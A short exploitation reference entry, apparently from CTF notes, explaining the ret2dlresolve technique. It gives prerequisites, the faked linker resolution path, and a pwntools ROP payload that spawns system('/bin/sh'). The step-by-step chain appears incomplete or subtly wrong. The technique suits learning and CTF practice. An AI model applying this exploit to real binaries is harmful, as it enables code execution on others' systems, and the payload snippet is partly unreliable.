# ret2dlresolve

**When:** No libc leak possible, no known libc version, but you can call PLT functions. Forces the dynamic linker to resolve `system` and call it.

**Prerequisites:**

- Partial RELRO (GOT is writable)
- Known BSS address (for fake relocation/symbol structures)
- `read` PLT entry (to write fake structures to BSS)

## How it works

When a PLT stub is called for the first time, the dynamic linker resolves the symbol by looking at relocation entries, symbol table, and string table. ret2dlresolve fakes these structures in BSS memory and triggers resolution of a fake entry pointing to `system`.

```
Normal resolution path:
1. PLT stub pushes an index onto stack
2. Jumps to GOT[1] (link_map) and GOT[2] (_dl_fixup)
3. _dl_fixup reads reloc entry at: .rela.plt + index
4. From reloc, reads symbol table entry from .dynsym
5. From symbol, reads string name from .dynstr
6. Resolves symbol and writes address to GOT

ret2dlresolve:
1. Write fake relocation entry to BSS (pointing to "system")
2. Write fake symbol entry to BSS (pointing to string "system")
3. Write "system\0" string to BSS
4. Set PLT index to point to our fake relocation
5. Trigger PLT call -> linker resolves "system" from our fake data
```

`pwntools` handles all the structure layout:

```python
from pwn import Ret2dlresolvePayload
dlresolve = Ret2dlresolvePayload(e, symbol="system", args=["/bin/sh"])
payload = flat({offset: [dlresolve.payload]})

# Or step-by-step:
dlresolve = Ret2dlresolvePayload(e, symbol="system", args=["/bin/sh"])
# Read structures to BSS
read_payload = flat({offset: [
    pop_rdi, 0,
    pop_rsi, dlresolve.data_addr,
    pop_rdx, len(dlresolve.payload),
    e.plt['read'],
    dlresolve.reloc_index,  # trigger resolution -> system("/bin/sh")
]})
```

## When to use

Prefer ret2libc (simpler, more reliable) when you have a leak. Use ret2dlresolve when:

- No libc leak is available
- The binary is statically linked against a limited libc
- You need to call a function not currently imported
